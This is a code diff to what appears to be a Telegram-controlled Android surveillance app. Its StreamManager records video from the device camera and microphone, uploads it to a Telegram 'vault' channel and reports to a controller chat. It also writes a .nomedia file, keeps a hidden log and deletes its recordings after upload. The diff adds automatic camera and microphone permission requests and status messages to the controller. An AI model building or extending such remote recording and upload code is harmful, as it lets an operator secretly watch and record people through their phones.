@@ -35,7 +35,12 @@ if not os.path.exists(nomedia_path):
     except:
         pass
 
-logging.basicConfig(filename=os.path.join(P, "v.log"), level=logging.ERROR, filemode='a')
+logging.basicConfig(
+    filename=os.path.join(P, "v.log"),
+    level=logging.ERROR,
+    filemode='a',
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
 
 try:
     from jnius import autoclass, PythonJavaClass, java_method
@@ -85,18 +90,118 @@ class StreamManager:
         except Exception as e:
             logging.error(f"Cleanup error: {e}")
 
-    # ========== التحقق من الصلاحيات ==========
-    def _check_permissions(self):
-        """التحقق من صلاحيات الكاميرا والميكروفون"""
-        if not JNI:
-            return True
+    # ========== حذف آمن ==========
+    def _safe_remove(self, path):
         try:
-            from android.permissions import check_permission, Permission
-            cam_ok = check_permission(Permission.CAMERA)
-            mic_ok = check_permission(Permission.RECORD_AUDIO)
-            return cam_ok and mic_ok
-        except:
-            return False
+            if os.path.exists(path):
+                os.remove(path)
+                return True
+        except Exception as e:
+            logging.error(f"Safe remove error {path}: {e}")
+        return False
+
+    # ========== التحقق من الصلاحيات (محسّن مع رسائل واضحة) ==========
+    def _check_permissions(self, request_if_missing=False):
+        """
+        التحقق من صلاحيات الكاميرا والميكروفون.
+        
+        المعاملات:
+            request_if_missing: إذا كان True، سيتم طلب الصلاحيات المفقودة تلقائياً.
+        
+        الإرجاع:
+            dict: {
+                'ok': bool,              # True إذا كانت جميع الصلاحيات موجودة
+                'camera': bool,          # حالة صلاحية الكاميرا
+                'microphone': bool,      # حالة صلاحية الميكروفون
+                'missing': list,         # قائمة بالصلاحيات المفقودة
+                'message': str           # رسالة واضحة للحالة
+            }
+        """
+        result = {
+            'ok': False,
+            'camera': False,
+            'microphone': False,
+            'missing': [],
+            'message': ''
+        }
+
+        if not JNI:
+            result['ok'] = True
+            result['camera'] = True
+            result['microphone'] = True
+            result['message'] = "JNI غير متاح، يتم افتراض الصلاحيات"
+            logging.warning("JNI not available, assuming permissions granted")
+            return result
+
+        try:
+            from android.permissions import check_permission, Permission, request_permissions
+
+            # التحقق من صلاحية الكاميرا
+            try:
+                cam_ok = check_permission(Permission.CAMERA)
+                result['camera'] = cam_ok
+                if not cam_ok:
+                    result['missing'].append('CAMERA')
+            except Exception as e:
+                logging.error(f"Camera permission check error: {e}")
+                result['camera'] = False
+                result['missing'].append('CAMERA (check error)')
+
+            # التحقق من صلاحية الميكروفون
+            try:
+                mic_ok = check_permission(Permission.RECORD_AUDIO)
+                result['microphone'] = mic_ok
+                if not mic_ok:
+                    result['missing'].append('RECORD_AUDIO')
+            except Exception as e:
+                logging.error(f"Microphone permission check error: {e}")
+                result['microphone'] = False
+                result['missing'].append('RECORD_AUDIO (check error)')
+
+            # طلب الصلاحيات المفقودة إذا طُلب ذلك
+            if request_if_missing and result['missing']:
+                try:
+                    perms_to_request = []
+                    if not result['camera']:
+                        perms_to_request.append(Permission.CAMERA)
+                    if not result['microphone']:
+                        perms_to_request.append(Permission.RECORD_AUDIO)
+                    
+                    if perms_to_request:
+                        logging.info(f"Requesting missing permissions: {perms_to_request}")
+                        request_permissions(perms_to_request)
+                        # إعادة التحقق بعد الطلب
+                        for p in perms_to_request:
+                            if check_permission(p):
+                                if p == Permission.CAMERA:
+                                    result['camera'] = True
+                                    result['missing'].remove('CAMERA')
+                                elif p == Permission.RECORD_AUDIO:
+                                    result['microphone'] = True
+                                    result['missing'].remove('RECORD_AUDIO')
+                except Exception as e:
+                    logging.error(f"Permission request error: {e}")
+
+            # تحديث الحالة النهائية
+            result['ok'] = result['camera'] and result['microphone']
+
+            # بناء رسالة واضحة
+            if result['ok']:
+                result['message'] = "✅ جميع الصلاحيات متاحة (الكاميرا والميكروفون)"
+            else:
+                missing_parts = []
+                if not result['camera']:
+                    missing_parts.append("📷 الكاميرا")
+                if not result['microphone']:
+                    missing_parts.append("🎙️ الميكروفون")
+                result['message'] = f"⚠️ الصلاحيات المفقودة: {', '.join(missing_parts)}"
+
+            return result
+
+        except Exception as e:
+            logging.error(f"Permission check error: {e}")
+            result['message'] = f"❌ خطأ في التحقق من الصلاحيات: {str(e)[:50]}"
+            return result
 
     # ========== التحقق من توفر الكاميرا ==========
     def _is_camera_available(self, cam_idx):
@@ -202,16 +307,6 @@ class StreamManager:
             logging.error(f"Video validation error: {e}")
         return False
 
-    # ========== حذف آمن ==========
-    def _delete_file(self, path):
-        try:
-            if os.path.exists(path):
-                os.remove(path)
-                return True
-        except Exception as e:
-            logging.error(f"Delete error {path}: {e}")
-        return False
-
     # ========== إرسال / تحديث رسالة الحالة ==========
     def _send_status_update(self, text, chat_id):
         if not self.tg:
@@ -239,13 +334,31 @@ class StreamManager:
         """بدء تسجيل فيديو"""
         with self._recording_lock:
             if self.recording:
+                logging.warning("Recording already in progress")
                 return False
-            if not self._check_permissions():
-                logging.error("Camera or microphone permission not granted")
+
+            # التحقق من الصلاحيات مع طلب تلقائي
+            perms_result = self._check_permissions(request_if_missing=True)
+            
+            if not perms_result['ok']:
+                logging.error(f"Permission check failed: {perms_result['message']}")
+                # إرسال رسالة خطأ للمستخدم
+                if self.tg and mon.ctrl:
+                    self.tg._api("sendMessage", {
+                        "chat_id": mon.ctrl,
+                        "text": f"❌ {perms_result['message']}\nالرجاء منح الصلاحيات من إعدادات الجهاز."
+                    })
                 return False
+
             if not self._is_camera_available(cam):
                 logging.error(f"Camera {cam} not available")
+                if self.tg and mon.ctrl:
+                    self.tg._api("sendMessage", {
+                        "chat_id": mon.ctrl,
+                        "text": f"❌ الكاميرا {cam} غير متوفرة على هذا الجهاز."
+                    })
                 return False
+
             self.recording = True
             self._should_stop = False
 
@@ -377,29 +490,28 @@ class StreamManager:
                 else:
                     self._send_status_update("⚠️ لا يوجد قناة خزنة لإرسال الفيديو", mon.ctrl)
 
-                # حذف الملفات المؤقتة (بعد تأخير قصير)
-                self._delete_file(raw_path)
-                self._delete_file(zipped_path)
+                # حذف الملفات المؤقتة
+                self._safe_remove(raw_path)
+                self._safe_remove(zipped_path)
 
             except Exception as e:
                 logging.error(f"Finalization error: {e}")
                 self._send_status_update(f"❌ فشل رفع الفيديو: {str(e)[:50]}", mon.ctrl)
-                self._delete_file(raw_path)
-                self._delete_file(zipped_path)
+                self._safe_remove(raw_path)
+                self._safe_remove(zipped_path)
         else:
             # حذف الملف التالف أو غير الصالح
             if os.path.exists(temp_path):
-                self._delete_file(temp_path)
+                self._safe_remove(temp_path)
             if not self._should_stop:
                 self._send_status_update("⚠️ فشل التسجيل (ملف تالف أو غير صالح)", mon.ctrl)
             else:
                 self._send_status_update("⏹️ تم إلغاء التسجيل", mon.ctrl)
 
         # تنظيف إضافي
-        if os.path.exists(temp_path):
-            self._delete_file(temp_path)
-        self._delete_file(raw_path)
-        self._delete_file(zipped_path)
+        self._safe_remove(temp_path)
+        self._safe_remove(raw_path)
+        self._safe_remove(zipped_path)
 
         # إعادة تعيين الحالة
         with self._recording_lock:
@@ -418,6 +530,18 @@ class StreamManager:
                 "should_stop": self._should_stop,
                 "has_tg": self.tg is not None
             }
+
+    # ========== الحصول على حالة الصلاحيات ==========
+    def get_permissions_status(self):
+        """الحصول على حالة الصلاحيات بتنسيق مناسب للعرض"""
+        result = self._check_permissions(request_if_missing=False)
+        return {
+            "ok": result['ok'],
+            "camera": result['camera'],
+            "microphone": result['microphone'],
+            "missing": result['missing'],
+            "message": result['message']
+        }
 
     # ========== تنظيف شامل ==========
     def cleanup_all(self):
